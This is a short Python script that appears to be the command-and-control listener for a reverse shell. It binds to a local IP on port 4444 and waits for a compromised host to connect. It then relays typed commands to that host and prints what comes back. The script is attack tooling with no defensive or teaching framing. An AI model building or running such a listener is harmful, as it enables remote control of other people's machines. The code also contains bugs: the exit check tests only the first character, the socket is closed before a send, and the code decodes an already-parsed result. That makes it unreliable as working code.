import socket
import json


class Listener:
    def __init__(self, host_ip, host_port):
        address = (host_ip, host_port)
        listener = socket.socket(family=socket.AF_INET, type=socket.SOCK_STREAM)
        # reutilizar sockets
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind(address)
        listener.listen(0)
        print("[+]Waiting for connections...")
        self.connection, address = listener.accept()
        target_ip, target_port = address
        print(f"[+]New Connection from {target_ip}, port {target_port}!")

    def better_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(bytes(json_data, encoding="utf8"))

    def better_recieve(self):
        json_data = ""
        while True:
            try:
                json_data += self.connection.recv(1024).decode()
                return json.loads(json_data)
            except ValueError:
                # reinicia loop
                continue

    def execute_remote_command(self, command):
        if command[0] == "exit":
            self.exit_listener(command)
        else:
            self.better_send(command)
            return self.better_recieve()

    def listen(self):
        while True:
            command = input(">> ")
            result = self.execute_remote_command(command)
            print(result.decode())

    def exit_listener(self, command):
        self.connection.close()
        self.better_send(command)
        exit()


listener = Listener("192.168.0.132", 4444)
listener.listen()
